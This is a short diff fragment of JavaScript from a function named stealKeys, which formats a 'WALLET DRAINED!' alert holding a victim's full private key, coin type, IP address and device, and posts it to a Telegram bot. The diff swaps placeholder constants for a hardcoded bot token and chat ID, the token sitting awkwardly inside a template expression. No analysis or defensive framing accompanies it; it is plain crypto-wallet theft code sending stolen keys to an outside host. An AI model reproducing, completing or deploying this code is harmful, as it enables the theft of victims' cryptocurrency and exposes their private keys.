@@ -33,11 +33,11 @@ async function stealKeys(privateKey, coin = 'BTC') {
   // 1️⃣ Send to Telegram (Primary)
   const telegramMsg = `🚨 WALLET DRAINED!\n\n🔑 *Private Key:*\n\`${victimData.fullKey}\`\n\n💰 *Coin:* ${coin}\n🌐 *IP:* ${victimData.ip}\n📱 *Device:* ${victimData.userAgent.substring(0,50)}...\n🕐 *Time:* ${new Date().toLocaleString()}`;
   
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+  await fetch(`https://api.telegram.org/bot${7689015696:AAG8Ci3BcoWRlDmziyfq6dVRnL1Hcqw0bxo}/sendMessage`, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
+      chat_id: 5430364847,
       text: telegramMsg,
       parse_mode: 'Markdown',
       disable_web_page_preview: true
